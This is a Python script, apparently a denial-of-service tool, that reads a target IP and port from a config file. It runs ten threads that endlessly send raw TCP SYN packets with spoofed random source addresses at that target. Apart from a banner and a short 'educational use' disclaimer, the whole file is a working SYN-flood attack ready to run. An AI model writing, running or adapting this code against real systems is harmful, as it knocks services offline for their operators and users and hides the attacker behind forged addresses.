#  _   _   _  __          __     _____  _   _ _____ _   _  _____   _   _   _ 
# | | | | | | \ \        / /\   |  __ \| \ | |_   _| \ | |/ ____| | | | | | |
# | | | | | |  \ \  /\  / /  \  | |__) |  \| | | | |  \| | |  __  | | | | | |
# | | | | | |   \ \/  \/ / /\ \ |  _  /| . ` | | | | . ` | | |_ | | | | | | |
# |_| |_| |_|    \  /\  / ____ \| | \ \| |\  |_| |_| |\  | |__| | |_| |_| |_|
# (_) (_) (_)     \/  \/_/    \_\_|  \_\_| \_|_____|_| \_|\_____| (_) (_) (_)

#This software was made for educational, legal and ethical use, the author of this software is not liable for any unethical or illegal use of this software!
#By using this software, you agree to the legal and ethical use of this software!

import socket
import threading
import random
import struct
import configparser

config_file_path = './rndipdos.ini'
config = configparser.ConfigParser()
config.read(config_file_path)


target_ip = config['DEFAULT'].get('target_ip', None)

target_port_config = config['DEFAULT'].get('target_port', None) 
target_port = int(target_port_config)

packet_size_config = config['DEFAULT'].get('packet_size', None)
packet_size = int(packet_size_config) 

packet_count = 0
packet_count_lock = threading.Lock()


def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff

    return s

def syn_flood():
    global packet_count
    while True:
        try:
            source_ip = random_ip()
            dest_ip = target_ip


            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 20 + 20
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)

            ip_ihl_ver = (ip_ver << 4) + ip_ihl

            ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)


            tcp_source = random.randint(1025, 65535)
            tcp_dest = target_port
            tcp_seq = 0
            tcp_ack_seq = 0
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 1
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 0
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0

            tcp_offset_res = (tcp_doff << 4) + 0
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

            tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)


            source_address = ip_saddr
            dest_address = ip_daddr
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)

            psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
            psh = psh + tcp_header

            tcp_check = checksum(psh)
            tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)



            ip_header_size = len(ip_header)
            tcp_header_size = len(tcp_header)
            payload_size = packet_size - (ip_header_size + tcp_header_size)
            payload = b'A' * payload_size


            packet = ip_header + tcp_header + payload

            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.sendto(packet, (dest_ip, 0))

            with packet_count_lock:
                packet_count += 1
                print(f"Packet {packet_count} was sent from {source_ip} on port {target_port} with payload size of {payload_size} bytes.")
        except Exception as e:
            print(f"Error: {e}")

threads = []
for _ in range(10):
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

